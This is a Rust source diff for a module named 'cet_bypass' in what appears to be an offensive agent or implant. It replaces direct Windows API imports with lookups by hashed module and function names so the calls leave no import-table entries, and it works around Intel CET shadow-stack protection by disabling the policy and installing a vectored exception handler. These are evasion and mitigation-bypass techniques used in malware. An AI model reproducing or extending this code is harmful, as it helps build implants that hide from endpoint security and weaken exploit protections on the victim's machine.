@@ -83,6 +83,28 @@ const EXCEPTION_CONTINUE_EXECUTION: LONG = -1;
 /// VEH handler return: continue search.
 const EXCEPTION_CONTINUE_SEARCH: LONG = 0;
 
+// ─── Dynamic API resolution ─────────────────────────────────────────────────
+
+/// Dynamically resolve and call `GetLastError` via pe_resolve (no IAT entry).
+fn dynamic_get_last_error() -> u32 {
+    let kernel32 = match pe_resolve::get_module_handle_by_hash(
+        pe_resolve::hash_str(b"kernel32.dll\0")
+    ) {
+        Some(b) => b,
+        None => return 0,
+    };
+    let fn_addr = match pe_resolve::get_proc_address_by_hash(
+        kernel32,
+        pe_resolve::hash_str(b"GetLastError\0")
+    ) {
+        Some(a) => a,
+        None => return 0,
+    };
+    let get_last_error: unsafe extern "system" fn() -> u32 =
+        unsafe { std::mem::transmute(fn_addr) };
+    unsafe { get_last_error() }
+}
+
 // ─── Global State ─────────────────────────────────────────────────────────
 
 /// Runtime CET status of the agent process.
@@ -350,7 +372,7 @@ fn detect_cet_state() {
 
     if result == 0 {
         // GetProcessMitigationPolicy failed — assume CET is not present.
-        let err = unsafe { winapi::um::errhandlingapi::GetLastError() };
+        let err = dynamic_get_last_error();
         log::warn!(
             "cet_bypass: GetProcessMitigationPolicy failed (error {}), assuming CET disabled",
             err
@@ -448,7 +470,7 @@ fn can_disable_cet_policy() -> bool {
     };
 
     if set_result == 0 {
-        let err = unsafe { winapi::um::errhandlingapi::GetLastError() };
+        let err = dynamic_get_last_error();
         // ERROR_ACCESS_DENIED (5) means we can't change the policy.
         const ERROR_ACCESS_DENIED: DWORD = 5;
         if err == ERROR_ACCESS_DENIED {
@@ -517,7 +539,7 @@ fn disable_cet_for_process(handle: HANDLE) -> bool {
         };
 
         if result == 0 {
-            let err = unsafe { winapi::um::errhandlingapi::GetLastError() };
+            let err = dynamic_get_last_error();
             log::warn!(
                 "cet_bypass: SetProcessMitigationPolicy failed for self (error {})",
                 err
@@ -964,17 +986,32 @@ unsafe extern "system" fn veh_shadow_stack_handler(
 fn install_veh_shadow_fix() {
     #[cfg(all(windows, feature = "kernel-callback"))]
     {
-        use winapi::um::errhandlingapi::GetLastError;
+        type FnAddVEH = unsafe extern "system" fn(
+            u32,
+            Option<unsafe extern "system" fn(*mut winapi::um::winnt::EXCEPTION_POINTERS) -> i32>,
+        ) -> *mut std::ffi::c_void;
 
-        let handler = unsafe {
-            winapi::um::errhandlingapi::AddVectoredExceptionHandler(
-                1, // CALL_FIRST
-                Some(veh_shadow_stack_handler),
-            )
+        let add_veh: Option<FnAddVEH> = (|| unsafe {
+            let k32 = pe_resolve::get_module_handle_by_hash(
+                pe_resolve::hash_str(b"kernel32.dll\0")
+            )?;
+            let hash = pe_resolve::hash_str(b"AddVectoredExceptionHandler\0");
+            let addr = pe_resolve::get_proc_address_by_hash(k32, hash)?;
+            Some(std::mem::transmute::<usize, FnAddVEH>(addr))
+        })();
+
+        let add_veh = match add_veh {
+            Some(f) => f,
+            None => {
+                log::error!("cet_bypass: cannot resolve AddVectoredExceptionHandler");
+                return;
+            }
         };
 
+        let handler = unsafe { add_veh(1, Some(veh_shadow_stack_handler)) };
+
         if handler.is_null() {
-            let err = unsafe { GetLastError() };
+            let err = dynamic_get_last_error();
             log::error!(
                 "cet_bypass: AddVectoredExceptionHandler failed (error {})",
                 err
